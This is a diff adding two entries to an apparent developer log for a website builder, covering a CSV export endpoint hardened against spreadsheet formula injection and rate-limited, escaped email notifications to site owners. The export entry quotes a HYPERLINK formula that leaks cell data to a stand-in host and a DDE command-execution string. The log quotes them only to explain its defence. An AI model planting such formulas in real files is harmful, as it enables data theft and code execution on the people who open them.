@@ -10268,3 +10268,86 @@ design … near-black #08070c"**. `styles.css` has said the opposite since 2026-
 platform (owner): high-contrast light, white surfaces, near-black ink" — so the doc was five days
 stale on the single most visible fact about the product, and my first render came out dark-on-dark
 because of it. Fixed, and pointed at `styles.css` as the authority so the next drift is obvious.
+
+---
+
+## 2026-07-28 — getting the data out, and the bug hiding in a CSV
+
+The Backups panel has had a working download button since the D1 era, wired to
+`/api/site/backend/export` — deleted 2026-07-27. So a barber shop's bookings could be read on screen
+and never got out of the building. `GET /api/site/<slug>/export?table=<t>&format=csv|json`, same gate
+as everything else.
+
+**The interesting part of a CSV export is not the commas.**
+
+A `collect` table is, by definition, text a stranger typed into a form. Excel, LibreOffice and Google
+Sheets all treat a cell beginning `=`, `+`, `-` or `@` as a **formula** and evaluate it on open. So a
+booking whose notes read
+
+```
+=HYPERLINK("https://evil.example/?"&A1,"Click for your receipt")
+```
+
+builds a live link out of the neighbouring cell the moment the owner opens the file — and
+`=cmd|'/c calc'!A1` is worse. The person attacked is the **owner**, by their own spreadsheet, using
+data our own API handed them.
+
+**Quoting does not fix this.** The CSV parser strips the quotes before the formula parser ever sees
+the cell. The value has to stop being a formula, so it is prefixed with `'`, which those programs
+read as "this is text".
+
+`-` is handled narrowly and deliberately: it is a real trigger (`-1+1` evaluates) but it is also how
+every negative number and plenty of dates begin. Blanket-prefixing would corrupt ordinary data in the
+common case to defend against the rare one — so a value that is simply a number is left alone, and
+anything else that starts dangerously is neutralised. Both halves are tested.
+
+Two smaller calls: the column list is `id`, `created_at`, the declared columns, **and then anything
+the rows really have that the schema never named** — an export that silently drops a column is not a
+backup. And `attachment`, never `inline`: owner-supplied text must not render as a document on our
+own origin.
+
+One of my own test expectations was wrong again and worth noting, because it is the same shape as
+last time: I asserted that a mid-value `\r` would be neutralised. It should not be — a control
+character only triggers the formula guard when it LEADS. The code was right; the test was wrong.
+
+Unit suite **454**, 24/24 mutations on the export.
+
+---
+
+## 2026-07-28 — somebody had to tell the owner
+
+The biggest hole left in the product, as opposed to the plumbing: **a barber shop took a booking and
+nobody told them.** The only way to find out was to log into isibi and look at the Data panel — a
+fine place to review bookings, a terrible way to learn one exists.
+
+A `collect` insert now emails the site owner, through the Go Farther mailer that already sends
+password resets.
+
+### The three things that made it more than "send an email"
+
+1. **It must never slow the visitor down, or break their booking.** The submit has already succeeded
+   by the time any of this runs. Detached through `ctx.waitUntil`, and every failure path inside
+   returns a *reason* rather than throwing — with the reason logged, because detached code that
+   throws just vanishes.
+2. **It must not be weaponisable.** A form is a public endpoint. "Every POST emails the owner" is a
+   mail bomb aimed at our own customer with a trigger anyone on the internet can pull. So there is a
+   five-minute cooldown — and it is claimed **in the database**, not in an isolate: Cloudflare runs
+   many isolates per colo, and a per-isolate memory would happily send one email from each of them.
+   One conditional `PATCH … WHERE notify AND notified_at < cutoff RETURNING` means exactly one caller
+   wins a window.
+3. **The submission is attacker-controlled text going into an HTML email.** Same class as the CSV
+   injection from earlier today, same discipline. Keys and values escaped, internal columns dropped,
+   twelve fields maximum, values clipped.
+
+And an off switch — `POST /api/site/<slug>/notify {on}`, with a toggle in the Data panel header.
+Unsolicited email with no way to stop it is not something to ship. It defaults ON, because a booking
+form nobody is told about is the bug this is fixing.
+
+### A test that would never have fired
+
+A mutation run caught one of mine: I asserted that `_fts` and `owner_id` do not appear in the email,
+but the key is rendered through `replace(/_/g, " ")` — so `_fts` displays as " fts" and the literal
+string I was looking for could never have been there. Re-asserted on distinctive *values* and on the
+row count instead. 21/21.
+
+Unit suite **474**.
